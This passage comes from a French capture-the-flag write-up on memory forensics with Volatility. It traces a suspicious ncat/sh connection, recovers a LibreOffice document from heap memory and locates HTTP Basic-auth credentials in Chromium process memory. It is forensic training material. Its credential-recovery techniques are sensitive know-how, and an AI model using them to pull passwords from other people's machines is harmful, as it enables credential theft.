Académie","uri":"maki.bzh/writeups/fcscfrench2020academie/"},{"categories":["Writeups"],"content":"TL;DR Ce challenge est dans la continuité du précédent sur l’analyse du dump. Grâce à linux_netscan, il est possible de voir des processus suspects. Ensuite, linux_pstree permet de s’en assurer. Enfin, l’horodatage est trouvable grâce à linux_pslist. ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020academie/:4:1","tags":["anssi","fcsc","forensic","volatility","memory analysis","keepass","chrome"],"title":"[French FCSC] - Académie","uri":"maki.bzh/writeups/fcscfrench2020academie/"},{"categories":["Writeups"],"content":"État des lieux Ce challenge est aussi de l’analyse plutôt basique d’un dump mémoire. Dans le challenge précédant, on commence par utiliser le plugin linux_netstat, par défaut il va aussi afficher les sockets unix, on n’y reprendra pas, allons voir le code: https://github.com/volatilityfoundation/volatility/blob/master/volatility/plugins/linux/netstat.py ➜ python volatility/vol.py --plugins=/opt/plug_vol/ -f /opt/usr_land/dmp.mem --profile=Linuxecsc_deb540x64 linux_netstat -U \u003e /opt/usr_land/netstat_wo_socketunix ➜ cat netstat_wo_socketunix ➜ cestlarentree cat netstat_wo_socketunix | grep ESTA [...] TCP fd:6663:7363:1000:c10b:6374:25f:dc37:36280 fd:6663:7363:1000:55cf:b9c6:f41d:cc24:58014 ESTABLISHED ncat/1515 [...] TCP fd:6663:7363:1000:c10b:6374:25f:dc37:36280 fd:6663:7363:1000:55cf:b9c6:f41d:cc24:58014 ESTABLISHED sh/119511 [...] En vrai, je suis pas un expert, mais un ncat et un sh… Mon petit passif de pentester me dit que ça sent pas bon. ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020academie/:4:2","tags":["anssi","fcsc","forensic","volatility","memory analysis","keepass","chrome"],"title":"[French FCSC] - Académie","uri":"maki.bzh/writeups/fcscfrench2020academie/"},{"categories":["Writeups"],"content":"Port en écoute En remontant cette piste, il est simple de trouver les informations que l’on cherche: 36280 ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020academie/:4:3","tags":["anssi","fcsc","forensic","volatility","memory analysis","keepass","chrome"],"title":"[French FCSC] - Académie","uri":"maki.bzh/writeups/fcscfrench2020academie/"},{"categories":["Writeups"],"content":"IP distante connectée L’IP distante aussi est donnée: fd:6663:7363:1000:55cf:b9c6:f41d:cc24 ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020academie/:4:4","tags":["anssi","fcsc","forensic","volatility","memory analysis","keepass","chrome"],"title":"[French FCSC] - Académie","uri":"maki.bzh/writeups/fcscfrench2020academie/"},{"categories":["Writeups"],"content":"Horodatage Pour l’horodatage, on a le PID du ncat et du sh. Avec linux_pstree il est possible de voir le processus parent facilement: ➜ python volatility/vol.py --plugins=/opt/plug_vol/ -f /opt/usr_land/dmp.mem --profile=Linuxecsc_deb540x64 linux_pstree \u003e /opt/usr_land/linux_pstree ➜ cat linux_pstree Name Pid Uid systemd 1 [...] .x-terminal-emul 1503 1001 ..bash 1513 1001 ...ncat 1515 1001 ....sh 119511 1001 En remontant sur le processus parent bash, la date est donc: ➜ python volatility/vol.py --plugins=/opt/plug_vol/ -f /opt/usr_land/dmp.mem --profile=Linuxecsc_deb540x64 linux_pslist -p 1513 Offset Name Pid PPid Uid Gid DTB Start Time ------------------ -------------------- --------------- --------------- --------------- ------ ------------------ ---------- 0xffff9d72c014dd00 bash 1513 1503 1001 1001 0x000000004012c000 2020-03-26 23:24:20 UTC+0000 2020-03-26 23:24:20 ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020academie/:4:5","tags":["anssi","fcsc","forensic","volatility","memory analysis","keepass","chrome"],"title":"[French FCSC] - Académie","uri":"maki.bzh/writeups/fcscfrench2020academie/"},{"categories":["Writeups"],"content":"Flag FCSC{36280:fd:6663:7363:1000:55cf:b9c6:f41d:cc24:2020-03-26 23:24:20} ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020academie/:4:6","tags":["anssi","fcsc","forensic","volatility","memory analysis","keepass","chrome"],"title":"[French FCSC] - Académie","uri":"maki.bzh/writeups/fcscfrench2020academie/"},{"categories":["Writeups"],"content":"Rédaction Le document note.docx vient d’être créé avec LibreOffice et enregistré avant le dump de la mémoire. Retrouvez son contenu ! Format du flag : FCSC{xxx}, où xxx est la chaîne qui vous sera indiquée à la lecture du contenu du document. ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020academie/:5:0","tags":["anssi","fcsc","forensic","volatility","memory analysis","keepass","chrome"],"title":"[French FCSC] - Académie","uri":"maki.bzh/writeups/fcscfrench2020academie/"},{"categories":["Writeups"],"content":"TL;DR Ce challenge consiste à récupérer le contenu d’un fichier “docx”. En sachant que c’est un docx, il est possible d’en créer un local, le décompresser et chercher la structure de “document.xml” en mémoire et ainsi trouver le flag. ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020academie/:5:1","tags":["anssi","fcsc","forensic","volatility","memory analysis","keepass","chrome"],"title":"[French FCSC] - Académie","uri":"maki.bzh/writeups/fcscfrench2020academie/"},{"categories":["Writeups"],"content":"État des lieux Pour ce challenge, on sait qu’on cherche un fichier docx et que l’utilisateur a utilisé LibreOffice. La grosse erreur est que je n’ai pas respecté ma méthodologie et je suis parti bille en tête “lol je ve trouvé 1 zip”. Après avoir vu que ça ne servait à rien d’y aller comme un débile, il est temps de se poser et de réfléchir. Pour mes tests, j’ai installé LibreOffice sur ma machine et lancé le “writer” (le Word du pauvre): ➜ ~ ps aux | grep 'office' maki 29586 0.0 0.0 176844 5912 ? Sl 15:59 0:00 /usr/lib/libreoffice/program/oosplash --writer maki 29601 7.0 1.3 7689752 219172 ? Sl 15:59 0:03 /usr/lib/libreoffice/program/soffice.bin --writer --splash-pipe=5 Visiblement ces processus sont présents aussi dans le dump: ➜ cat linux_pstree| grep -E \"soffice|oosplash\" .oosplash 119599 1001 soffice.bin 119615 1001 En continuant à piger le fonctionnement de libreOffice, j’ai remarqué qu’un dossier est apparu dans mon /tmp: ➜ /tmp ls -la | grep lu drwx------ 2 maki maki 4096 mai 3 15:59 lu29601r4fv4s.tmp ➜ /tmp ls -la lu29601r4fv4s.tmp total 44 drwx------ 2 maki maki 4096 mai 3 15:59 . drwxrwxrwt 26 root root 40960 mai 3 15:59 .. -rw------- 1 maki maki 0 mai 3 15:59 lu29601r4fv4t.tmp Un fichier vide, ce dossier est surement utilisé pour la sauvegarde automatique des documents ou ce genre de choses. En théorie, si le fichier est sauvegardé, une copie est présente ici. Voyons si ce dossier est présent dans le dump: ➜ python volatility/vol.py --plugins=/opt/plug_vol/ -f /opt/usr_land/dmp.mem --profile=Linuxecsc_deb540x64 linux_find_file -L \u003e /opt/usr_land/linuxff.txt ➜ cat linuxff.txt| grep \"/tmp/lu\" 923875 0xffff9d72891fe628 /tmp/lu1196159e8v1r.tmp 923893 0xffff9d72c2cc3bf8 /tmp/lu1196159e8v1r.tmp/lu1196159e8v23.tmp 923884 0xffff9d72c2cc0d90 /tmp/lu1196159e8v1r.tmp/lu1196159e8v22.tmp 923876 0xffff9d72891ce628 /tmp/lu1196159e8v1r.tmp/lu1196159e8v1t.tmp ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020academie/:5:2","tags":["anssi","fcsc","forensic","volatility","memory analysis","keepass","chrome"],"title":"[French FCSC] - Académie","uri":"maki.bzh/writeups/fcscfrench2020academie/"},{"categories":["Writeups"],"content":"Mécanisme de sauvegarde de LibreOffice Après avoir créé et sauvegardé un fichier ODT, le dossier à bien bougé: ➜ ~ ls -la /tmp/lu29601r4fv4s.tmp total 56 drwx------ 2 maki maki 4096 mai 3 16:06 . drwxrwxrwt 27 root root 40960 mai 3 16:06 .. -rw------- 1 maki maki 0 mai 3 16:06 lu29601r4fv4u.tmp -rw-r--r-- 1 maki maki 8504 mai 3 16:06 lu29601r4fv4y.tmp Il s’agit bien de notre fichier ODT, c’est le même hash: ➜ ~ file /tmp/lu29601r4fv4s.tmp/lu29601r4fv4y.tmp /tmp/lu29601r4fv4s.tmp/lu29601r4fv4y.tmp: OpenDocument Text ➜ ~ md5sum /tmp/lu29601r4fv4s.tmp/lu29601r4fv4y.tmp ~/Documents/ctf/ecsc2020/cestlarentree/Wu/test_odt.odt aba6138e65c1dc360920d63772e5c9c0 /tmp/lu29601r4fv4s.tmp/lu29601r4fv4y.tmp aba6138e65c1dc360920d63772e5c9c0 /home/maki/Documents/ctf/ecsc2020/cestlarentree/Wu/test_odt.odt Bon, par contre, on cherche un DOCX et pas un ODT. On va retenter l’expérience avec un DOCX. D’ailleurs, les dossiers temporaires se suppriment lorsque que le processus soffibe.bin se termine. Après la création et la sauvegarde d’un fichier DOCX, un phénomène intéressant apparait sur les fichiers temporaires… Ou plutot n’apparait pas: ➜ ~ ls -la /tmp/lu30353r4wuxv.tmp/ total 44 drwx------ 2 maki maki 4096 mai 3 16:13 . drwxrwxrwt 26 root root 40960 mai 3 16:13 .. -rw------- 1 maki maki 0 mai 3 16:12 lu30353r4wuxw.tmp -rw------- 1 maki maki 0 mai 3 16:13 lu30353r4wuxx.tmp Les fichiers temporaires sont vides, c’est pour cela qu’extraire les fichiers temporaires du dump mémoire ne donnent rien, ce n’est pas le profile volatility ou encore volatility lui même qui ne fonctionne pas correctement, c’est juste que les fichiers existent, mais ne contiennent rien. ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020academie/:5:3","tags":["anssi","fcsc","forensic","volatility","memory analysis","keepass","chrome"],"title":"[French FCSC] - Académie","uri":"maki.bzh/writeups/fcscfrench2020academie/"},{"categories":["Writeups"],"content":"La structure d’un Docx Si ces fichiers n’existent pas dans les fichiers temporaires, alors la structure du DOCX doit exister en mémoire. Mais avant, comment ça fonctionne un DOCX. On vient de créer le fichier suivant: test_docx.docx Si on prend les premiers octets: ➜ Wu file test_docx.docx test_docx.docx: Microsoft Word 2007+ ➜ Wu hexdump -C test_docx.docx| head -n 5 00000000 50 4b 03 04 14 00 08 08 08 00 b3 71 a3 50 00 00 |PK.........q.P..| 00000010 00 00 00 00 00 00 00 00 00 00 0b 00 00 00 5f 72 |.............._r| 00000020 65 6c 73 2f 2e 72 65 6c 73 ad 92 4d 4b 03 41 0c |els/.rels..MK.A.| 00000030 86 ef fd 15 43 ee dd 6c 2b 88 c8 ce f6 22 42 6f |....C..l+....\"Bo| 00000040 22 f5 07 84 99 ec ee d0 ce 07 33 69 ad ff de 41 |\".........3i...À| https://en.wikipedia.org/wiki/List_of_file_signatures En théorie, il est possible de décompresser un fichier DOCX: ➜ unzip test_docx.docx ➜ tree . . ├── [Content_Types].xml ├── docProps │ ├── app.xml │ └── core.xml ├── _rels ├── test_docx.docx └── word ├── document.xml ├── fontTable.xml ├── _rels │ └── document.xml.rels ├── settings.xml └── styles.xml 4 directories, 9 files Il y a donc tout un tas de fichiers XML. Avec notre DOCX, on sait que le contenu est “TEST D’UN FICHIER DOCX”. Voyons où il apparait: Good, maintenant on sait qu’on cherche le fichier “document.xml” probablement ouvert en mémoire de soffice.bin. Pour s’en assurer et éviter de faire un grep comme un débile sur tout le dump, on peut faire une yararule grâce à volatility, en cherchant à partir de \u003cw:document: ➜ python volatility/vol.py --plugins=/opt/plug_vol/ -f /opt/usr_land/dmp.mem --profile=Linuxecsc_deb540x64 linux_yarascan -Y \"\u003cw:document\" Task: soffice.bin pid 119615 rule r1 addr 0x5636239689e0 0x5636239689e0 3c 77 3a 64 6f 63 75 6d 65 6e 74 20 78 6d 6c 6e \u003cw:document.xmln 0x5636239689f0 73 3a 6f 3d 22 75 72 6e 3a 73 63 68 65 6d 61 73 s:o=\"urn:schemas 0x563623968a00 2d 6d 69 63 72 6f 73 6f 66 74 2d 63 6f 6d 3a 6f -microsoft-com:o 0x563623968a10 66 66 69 63 65 3a 6f 66 66 69 63 65 22 20 78 6d ffice:office\".xm 0x563623968a20 6c 6e 73 3a 72 3d 22 68 74 74 70 3a 2f 2f 73 63 lns:r=\"http://sc 0x563623968a30 68 65 6d 61 73 2e 6f 70 65 6e 78 6d 6c 66 6f 72 hemas.openxmlfor 0x563623968a40 6d 61 74 73 2e 6f 72 67 2f 6f 66 66 69 63 65 44 mats.org/officeD 0x563623968a50 6f 63 75 6d 65 6e 74 2f 32 30 30 36 2f 72 65 6c ocument/2006/rel 0x563623968a60 61 74 69 6f 6e 73 68 69 70 73 22 20 78 6d 6c 6e ationships\".xmln 0x563623968a70 73 3a 76 3d 22 75 72 6e 3a 73 63 68 65 6d 61 73 s:v=\"urn:schemas 0x563623968a80 2d 6d 69 63 72 6f 73 6f 66 74 2d 63 6f 6d 3a 76 -microsoft-com:v 0x563623968a90 6d 6c 22 20 78 6d 6c 6e 73 3a 77 3d 22 68 74 74 ml\".xmlns:w=\"htt 0x563623968aa0 70 3a 2f 2f 73 63 68 65 6d 61 73 2e 6f 70 65 6e p://schemas.open 0x563623968ab0 78 6d 6c 66 6f 72 6d 61 74 73 2e 6f 72 67 2f 77 xmlformats.org/w 0x563623968ac0 6f 72 64 70 72 6f 63 65 73 73 69 6e 67 6d 6c 2f ordprocessingml/ 0x563623968ad0 32 30 30 36 2f 6d 61 69 6e 22 20 78 6d 6c 6e 73 2006/main\".xmlns Bon et bien on dirait que le document.xml a été retrouvé à l’adresse 0x5636239689e0. ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020academie/:5:4","tags":["anssi","fcsc","forensic","volatility","memory analysis","keepass","chrome"],"title":"[French FCSC] - Académie","uri":"maki.bzh/writeups/fcscfrench2020academie/"},{"categories":["Writeups"],"content":"Extraction de la zone mémoire de soffice.bin Il ne reste plus qu’à extraire cette portion de la mémoire. D’abord localiser notre adresse trouvée précédemment: ➜ python volatility/vol.py --plugins=/opt/plug_vol/ -f /opt/usr_land/dmp.mem --profile=Linuxecsc_deb540x64 linux_proc_maps -p 119615 Offset Pid Name Start End Flags Pgoff Major Minor Inode File Path ------------------ -------- -------------------- ------------------ ------------------ ------ ------------------ ------ ------ ---------- --------- [...] 0xffff9d72848edd00 119615 soffice.bin 0x000056361c0cb000 0x0000563623f25000 rw- 0x0 0 0 0 [heap] [...] On dirait bien que notre adresse se trouve dans la heap du processus soffice.bin. Il ne reste qu’à l’extraire: ➜ python volatility/vol.py --plugins=/opt/plug_vol/ -f /opt/usr_land/dmp.mem --profile=Linuxecsc_deb540x64 linux_dump_map -p 119615 -s 0x000056361c0cb000 -D /opt/usr_land/wu/ Task VM Start VM End Length Path ---------- ------------------ ------------------ ------------------ ---- 119615 0x000056361c0cb000 0x0000563623f25000 0x7e5a000 /opt/usr_land/Wu/task.119615.0x56361c0cb000.vma ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020academie/:5:5","tags":["anssi","fcsc","forensic","volatility","memory analysis","keepass","chrome"],"title":"[French FCSC] - Académie","uri":"maki.bzh/writeups/fcscfrench2020academie/"},{"categories":["Writeups"],"content":"Chercher la structure du XML Maintenant, l’outil indispensable: ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020academie/:5:6","tags":["anssi","fcsc","forensic","volatility","memory analysis","keepass","chrome"],"title":"[French FCSC] - Académie","uri":"maki.bzh/writeups/fcscfrench2020academie/"},{"categories":["Writeups"],"content":"Flag FCSC{PQHJRTSFYH-3467024-LSHRFLDFGA} ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020academie/:5:7","tags":["anssi","fcsc","forensic","volatility","memory analysis","keepass","chrome"],"title":"[French FCSC] - Académie","uri":"maki.bzh/writeups/fcscfrench2020academie/"},{"categories":["Writeups"],"content":"Académie - Dans les nuages Le poste en cours d’analyse est connecté à un serveur web à l’adresse 10.42.42.132. Le serveur web est protégé par une authentification. Retrouvez le nom d’utilisateur et le mot de passe de cette connexion. Format du flag : FCSC{utilisateur:mot_de_passe}. Ce flag est sensible à la casse. ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020academie/:6:0","tags":["anssi","fcsc","forensic","volatility","memory analysis","keepass","chrome"],"title":"[French FCSC] - Académie","uri":"maki.bzh/writeups/fcscfrench2020academie/"},{"categories":["Writeups"],"content":"TL;DR Pour ce challenge, il faut recréer l’infrastructure de l’authentification afin de voir où se trouvent en mémoire les identifiants. Au final, on se retrouve dans une section mémoire de chromium avec les identifiants à la suite encodés en utf16. ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020academie/:6:1","tags":["anssi","fcsc","forensic","volatility","memory analysis","keepass","chrome"],"title":"[French FCSC] - Académie","uri":"maki.bzh/writeups/fcscfrench2020academie/"},{"categories":["Writeups"],"content":"État des lieux Alors pour ce dernier challenge d’une série très intéressante, c’est vraiment le boss final. Si on devait faire l’analogie de ce challenge avec autre chose, on pourrait dire que c’est comme chercher une aiguille, dans un tas d’autres aiguilles et le tout dans un gros tas de foin. Donc là, on va essayer de ne pas partir comme un débile, parce que déjà que dans les challenges de forensic c’est facile de se perdre, mais alors ici, c’est presque sûr. Ce qu’on sait: Adresse IP du serveur web : 10.42.42.132; Authentification par login / mot de passe (basic auth ? form html ?). Ce qu’on cherche: Des identifiants (user/password). La première chose qui peut être utile est de faire un yarascan sur l’adresse IP pour essayer d’avoir des pistes de recherches: ➜ vol.py --plugins=/opt/plug_vol/ -f usr_land/dmp.mem --profile=Linuxecsc_deb540x64 linux_yarascan -Y \"10.42.42.132\" | tee /opt/usr_land/yarascan_10.42.42.132.txt ➜ yarascan_10.42.42.132.txt | grep -B 2 Task [.. L'output est suuuuper verbeuse, donc j'vais trier pour le WU :) ..] Task: chromium pid 119148 rule r1 addr 0x55f4346630eb 0x55f4346630eb 31 30 2e 34 32 2e 34 32 2e 31 33 32 2f 70 61 6e 10.42.42.132/pan 0x55f4346630fb 65 6c 2f 00 00 00 00 00 00 00 00 00 00 04 00 00 el/............. [...] Task: chromium pid 119187 rule r1 addr 0x7fb1cc18dfa7 0x7fb1cc18dfa7 31 30 2e 34 32 2e 34 32 2e 31 33 32 2f 66 61 76 10.42.42.132/fav 0x7fb1cc18dfb7 69 63 6f 6e 2e 69 63 6f 00 10 00 00 00 00 00 00 icon.ico........ [...] Task: chromium pid 119218 rule r1 addr 0x7efedc023373 0x7efedc023373 31 30 2e 34 32 2e 34 32 2e 31 33 32 2f 70 61 6e 10.42.42.132/pan 0x7efedc023383 65 6c 2f 00 00 00 00 00 00 00 00 00 00 03 00 00 el/............. -- Task: chromium pid 119233 rule r1 addr 0x55f4febd60eb 0x55f4febd60eb 31 30 2e 34 32 2e 34 32 2e 31 33 32 2f 70 61 6e 10.42.42.132/pan 0x55f4febd60fb 65 6c 2f 00 00 00 00 00 00 00 00 00 00 04 00 00 el/............. [...] Task: chromium pid 119274 rule r1 addr 0x55f504bf68b9 0x55f504bf68b9 31 30 2e 34 32 2e 34 32 2e 31 33 32 3a 38 30 2c 10.42.42.132:80, 0x55f504bf68c9 2a 22 3a 7b 22 6c 61 73 74 5f 6d 6f 64 69 66 69 *\":{\"last_modifi -- Task: chromium pid 119302 rule r1 addr 0x55f4febd60eb 0x55f4febd60eb 31 30 2e 34 32 2e 34 32 2e 31 33 32 2f 70 61 6e 10.42.42.132/pan 0x55f4febd60fb 65 6c 2f 00 00 00 00 00 00 00 00 00 00 04 00 00 el/............. [...] Task: chromium pid 119364 rule r1 addr 0x16a55ae239d3 0x16a55ae239d3 31 30 2e 34 32 2e 34 32 2e 31 33 32 65 02 00 00 10.42.42.132e... 0x16a55ae239e3 00 0e 00 00 00 00 00 00 4a 41 63 63 65 73 73 20 ........JAccess. -- Task: soffice.bin pid 119615 rule r1 addr 0x7fee90d25b1b 0x7fee90d25b1b 31 30 2e 34 32 2e 34 32 2e 31 33 32 44 43 46 37 10.42.42.132DCF7 0x7fee90d25b2b 41 35 38 39 35 42 46 37 41 37 45 43 31 37 41 39 A5895BF7A7EC17A9 -- Task: chromium pid 119757 rule r1 addr 0x55f4febd60eb 0x55f4febd60eb 31 30 2e 34 32 2e 34 32 2e 31 33 32 2f 70 61 6e 10.42.42.132/pan 0x55f4febd60fb 65 6c 2f 00 00 00 00 00 00 00 00 00 00 04 00 00 el/............. Bon, cet énorme output nous apprend plusieurs choses: Probablement que Chromium a été utilisé pour la connexion ; Il existe un dossier /panel/. Il existe d’autres outils que volatility pour analyser la mémoire, par exemple bulk_extractor permet notamment de créer un pcap avec les traces laissées dans le dump: ➜ bulk_extractor -o bulk dmp.mem Le pcap généré nous donne quelques informations supplémentaires: On répond donc à une question du début sur le type d’authentification, c’est une Basic authentication, le realm est Panel \\o/ et le serveur web utilisé est un nginx 1.14.2. Ce qui est un marqueur supplémentaire pour notre recherche. Avant d’aller plus loin, une connexion via Basic authentication, se fait avec une pop qui demande les identifiants. Ces identifiants sont placés dans un header HTTP Authorization: Basic base64(username:password). Après quelques recherches non concluantes autour de ça, il est temps de revoir la méthode de travail. Le but va être de recréer ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020academie/:6:2","tags":["anssi","fcsc","forensic","volatility","memory analysis","keepass","chrome"],"title":"[French FCSC] - Académie","uri":"maki.bzh/writeups/fcscfrench2020academie/"},{"categories":["Writeups"],"content":"Proof of concept Mise en place de l’infrastructure Pour la partie client, on a déjà la VM de test: celle qui nous a permis de faire le profil volatility dans les challenges précédents. Il ne reste qu’à installer une interface graphique (comme xfce4) et chromium. Pour le serveur nginx, un bon vieux Docker Debian fera l’affaire en suivant un bon p’tit tuto des familles: https://ahmet.im/blog/docker-http-basic-auth/ ➜ ~ docker run --name basic_authent -p4242:4242 -ti debian:latest /bin/bash ➜ (docker) apt-get install nginx apache2-utils ➜ (docker) htpasswd -c /etc/nginx/.htpasswd maki Password: JeSuisUnGrosZgueg ➜ (docker) sed -i 's/user .*;/user root;/' /etc/nginx/nginx.conf ➜ (docker) tee /etc/nginx/sites-enabled/docker \u003c\u003cEOF upstream docker { server unix:/var/run/docker.sock; } server { listen 4242 default_server; location / { proxy_pass http://docker; auth_basic_user_file /etc/nginx/.htpasswd; auth_basic \"SecretPanelMofo\"; } } EOF ➜ (docker) service nginx restart L’infrastructure a l’air d’être prête, on redémarre la machine cliente pour vider la mémoire et on initialise une connexion. Le prompt apparait et on entre 1 fois les mauvais identifiants et 1 fois les bons, pour avoir un statut 401 comme dans bulk_extractor et un 200, parce que c’est quand même les bons identifiants qu’on cherche à la base. Les mauvais identifiants: USERPASBON_MARQUEUR : USERPASBON_MARQUEURPASS Les bons identifiants: maki : JeSuisUnGrosZgueg Maintenant on met la machine en pause et on récupère la mémoire. Utilisant VMWare, il est possible de récupérer la mémoire avec le fichier vmem. Analyse du PoC Comme on a utilisé la même machine virtuelle que pour la création du profil, on s’épargne une étape fastidieuse: ➜ python volatility/vol.py --plugins=/opt/plug_vol/ -f /opt/usr_land/localtest/test\\ ecsc\\ deb10-f35aa608.vmem --profile=Linuxecsc_deb540x64 linux_banner Linux version 5.4.0-4-amd64 (debian-kernel@lists.debian.org) (gcc version 9.2.1 20200203 (Debian 9.2.1-28)) #1 SMP Debian 5.4.19-1 (2020-02-13) Il est temps de partir à la recherche de nos marqueurs, pas classe, mais efficace. Avant d’attendre 5 minutes qu’un Yarascan se termine, on va vérifier que les identifiants apparaissent bien en clair dans la mémoire: ➜ localtest strings test\\ ecsc\\ deb10-f35aa608.vmem| grep -E '^maki$|JeSuisUnGrosZgueg' | sort | uniq maki ➜ strings -e l test\\ ecsc\\ deb10-f35aa608.vmem| grep -E 'maki|JeSuisUnGrosZgueg' | sort | uniq mikmaki [...] maki [...] JeSuisUnGrosZgueg Par contre, les identifiants en mémoire sont encodés sur 16 bytes. Il faut donc adapter la rule en conséquence: ➜ python volatility/vol.py --plugins=/opt/plug_vol/ -f /opt/usr_land/localtest/test\\ ecsc\\ deb10-f35aa608.vmem --profile=Linuxecsc_deb540x64 linux_yarascan -Y \"{4a ?? 65 ?? 53 ?? 75 ?? 69 ?? 73 ?? 55 ?? 6e ?? 47}\" Task: chromium pid 861 rule r1 addr 0x7f30980e8ea0 0x7f30980e8ea0 4a 00 65 00 53 00 75 00 69 00 73 00 55 00 6e 00 J.e.S.u.i.s.U.n. 0x7f30980e8eb0 47 00 72 00 6f 00 73 00 5a 00 67 00 75 00 65 00 G.r.o.s.Z.g.u.e. 0x7f30980e8ec0 67 00 00 00 00 00 00 00 95 00 00 00 00 00 00 00 g............... 0x7f30980e8ed0 10 af 00 8c 30 7f 00 00 d0 08 00 98 30 7f 00 00 ....0.......0... 0x7f30980e8ee0 a0 dd 06 98 30 7f 00 00 00 00 00 00 00 00 00 00 ....0........... 0x7f30980e8ef0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x7f30980e8f00 00 00 00 00 00 00 00 00 00 01 09 98 30 7f 00 00 ............0... 0x7f30980e8f10 40 3a 02 98 30 7f 00 00 48 00 00 00 00 00 00 00 @:..0...H....... 0x7f30980e8f20 88 3a 02 98 30 7f 00 00 50 02 00 00 00 00 00 00 .:..0...P....... 0x7f30980e8f30 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 0x7f30980e8f40 00 00 00 00 00 00 00 00 e8 49 8a 9d ad c4 e5 bb .........I...... 0x7f30980e8f50 be 3d 6c 31 df 92 20 98 25 00 00 00 00 00 00 00 .=l1....%....... 0x7f30980e8f60 01 00 00 00 00 7f 00 00 00 00 00 00 00 00 00 00 ................ 0x7f30980e8f70 69 64 61 74 6f 72 00 00 a5 00 00 00 00 00 00 00 idator.......... 0x7f30980e8f80 02 00 01 bb ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020academie/:6:3","tags":["anssi","fcsc","forensic","volatility","memory analysis","keepass","chrome"],"title":"[French FCSC] - Académie","uri":"maki.bzh/writeups/fcscfrench2020academie/"},{"categories":["Writeups"],"content":"À la recherche des identifiants perdus Le plugin pstree de volatility a déjà été exécuté dans les challenges précédents: ➜ cat linux_pstree | grep chromium .....chromium 119148 1001 .......chromium 119163 1001 ........chromium 119165 1001 .........chromium 119218 1001 .........chromium 119233 1001 .........chromium 119274 1001 .........chromium 119302 1001 .........chromium 119364 1001 .........chromium 119380 1001 .........chromium 119394 1001 .........chromium 119735 1001 .........chromium 119757 1001 chromium 119184 1001 chromium 119187 1001 En suivant la logique précédente, le processus qui nous intéresse est le 119187: ➜ python volatility/vol.py --plugins=/opt/plug_vol/ -f /opt/usr_land/dmp.mem --profile=Linuxecsc_deb540x64 linux_pslist | grep chromium Volatility Foundation Volatility Framework 2.6.1 0xffff9d72c1848f80 chromium 119148 1378 1001 1001 0x0000000013768000 2020-03-26 23:27:39 UTC+0000 0xffff9d72940e8000 chromium 119163 119162 1001 1001 0x0000000001f0c000 2020-03-26 23:27:39 UTC+0000 0xffff9d72940eae80 chromium 119165 119163 1001 1001 0x000000004213c000 2020-03-26 23:27:39 UTC+0000 0xffff9d72bd57be00 chromium 119184 119180 1001 1001 0x0000000011360000 2020-03-26 23:27:39 UTC+0000 0xffff9d72bd57cd80 chromium 119187 119180 1001 1001 0x0000000011296000 2020-03-26 23:27:39 UTC+0000 0xffff9d729ce6dd00 chromium 119218 119165 1001 1001 0x00000000107da000 2020-03-26 23:27:40 UTC+0000 0xffff9d7283045d00 chromium 119233 119165 1001 1001 0x0000000003058000 2020-03-26 23:27:40 UTC+0000 0xffff9d72824e3e00 chromium 119274 119165 1001 1001 0x00000000025dc000 2020-03-26 23:27:46 UTC+0000 0xffff9d7282481f00 chromium 119302 119165 1001 1001 0x0000000004ece000 2020-03-26 23:27:46 UTC+0000 0xffff9d7284f86c80 chromium 119364 119165 1001 1001 0x00000000052fe000 2020-03-26 23:27:50 UTC+0000 0xffff9d7284f82e80 chromium 119380 119165 1001 1001 0x000000001a206000 2020-03-26 23:28:02 UTC+0000 0xffff9d729a269f00 chromium 119394 119165 1001 1001 0x000000001a29e000 2020-03-26 23:28:02 UTC+0000 0xffff9d72940e4d80 chromium 119735 119165 1001 1001 0x0000000011234000 2020-03-26 23:39:05 UTC+0000 0xffff9d72c1848000 chromium 119757 119165 1001 1001 0x0000000002e62000 2020-03-26 23:39:08 UTC+0000 On peut exclure tous les processus dont le père est 119165, car il s’agit du broker de Chromium, mais comme vu précédemment le processus que l’on cherche ne dépend pas du broker. Le broker de Chromium est le processus principal, en l’occurrence: 119165. Ensuite, chaque processus fils seront des sites, des iframes, etc… Ces processus seront sandboxés par Chromium: https://chromium.googlesource.com/chromium/src/+/master/docs/design/sandbox.md Les processus 119218, 119233, 119274, 119302, 119364, 119380, 119394, 119735, 119757, ne nous intéressent donc pas dans ce cas. Pour coller au PoC fait dans le chapitre précédent, il faut trouver deux processus chromium avec le même parent. Le processus 119180 doit donc être ThreadPoolSingl. ➜ python volatility/vol.py --plugins=/opt/plug_vol/ -f /opt/usr_land/dmp.mem --profile=Linuxecsc_deb540x64 linux_pslist | grep 119180 Offset Name Pid PPid Uid Gid DTB Start Time ------------------ -------------------- --------------- --------------- --------------- ------ ------------------ ---------- 0xffff9d72bd57be00 chromium 119184 119180 1001 1001 0x0000000011360000 2020-03-26 23:27:39 UTC+0000 0xffff9d72bd57cd80 chromium 119187 119180 1001 1001 0x0000000011296000 2020-03-26 23:27:39 UTC+0000 A partir de ce point, il existe au moins deux méthodes pour trouver les identifiants. On sait qu’il faut creuser dans le processus 119187, car comme dans le PoC, il s’agit du second processus exécuté. ","date":"2020-06-27","objectID":"maki.bzh/writeups/fcscfrench2020academie/:6:4","tags":["anssi","fcsc","forensic","volatility","memory analysis","keepass","chrome"],"title":"[French FCSC] - Académie","uri":"maki.bzh/writeups/fcscfrench2020academie/"},{"categories":["Writeups"],"content":"Solution 1 - Trouver la structure en mémoire En connaissant la structure en mémoire, il est possible de commencer à chercher en partant de la chaine du “realm”: On peut 